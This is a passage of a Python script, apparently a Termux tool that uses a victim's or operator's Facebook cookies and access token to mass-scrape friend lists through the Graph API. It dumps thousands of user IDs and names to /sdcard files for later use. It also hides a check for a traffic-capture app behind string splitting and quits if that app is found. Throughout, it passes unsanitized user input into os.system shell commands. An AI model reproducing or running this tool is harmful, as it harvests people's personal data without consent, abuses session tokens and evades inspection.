                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        sid = "1"
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo)
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'=')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        print(' Total ids Extracted : '+str(len(total)))
        input(' Press enter to back ')
        main()

def new_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo)
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
        try:
                sl = int(input('\n How Many Links To Grab : '))
        except:
                sl = 1
        for el in range(sl):
                sid = input(f' Put {el+1} link: ')
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo)
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'=')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                son = f"ziajee{str(random.randint(0,90))}.txt"
        except:
                son = f"ziajee{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
        print(' Total ids Extracted : '+str(len(total)))
        print(' New ids Saved As : /sdcard/'+son)
        print(' Normal ids Saved As : '+sf)
        input(' Press enter to back ')
        main()

def iamBadBoy(exid,cookies,access_token,sf):
        try:
                global total,loop
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
                xyz = requests.Session()
                r = xyz.get(fd_url,cookies=cookies).text
                q = json.loads(r)
                for yaad in q['friends']['data']:
                        iid = yaad['id']
                        name = yaad['name']
                        total.append(iid)
                        open(sf,'a').write(iid+'|'+name+'\n')
                loop+=1
                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        except Exception as e:
                pass
                #print(e)
        except KeyError:
                pass

def sep():
        os.system('clear');print(logo)
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(44*"\033[0m=")
        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(44*"\033[0m=")
        input('\033[0m[Press enter to back] ')
        main()

def double():
        os.system('clear')
        print(logo)
        user_file = input('File Path : ')
        try:
                open(user_file,'r').read()
                print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
                save_file = input('Save new file as: ')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print(50*'=')
                print(' Fully Removed Multi Lines Ids')
                print(' Dublicate Lines Removed From File')
                print(' File Saved As : '+save_file)
                print(50*'=')
                input('Press enter to back ')
                main()
        except FileNotFoundError:
                print(' Invalid File ')

#----[http-capture]----
try:
        a = "anar"
        t="tt"
        fileee = os.listdir('/sdcard/Android/data/')
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('error occur 0')
                exit()
                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923030362621')
except Exception as e:
        print(e)
        pass
except PermissionError:
        pass


'''#----[if-fork]------
pat = os.getcwd()
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/Zee' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        exit("Type > cd ~ && python zia.py")

if not os.path.exists('.fam'):
        qsbuy()
else:
        qsbuy()
'''
main()
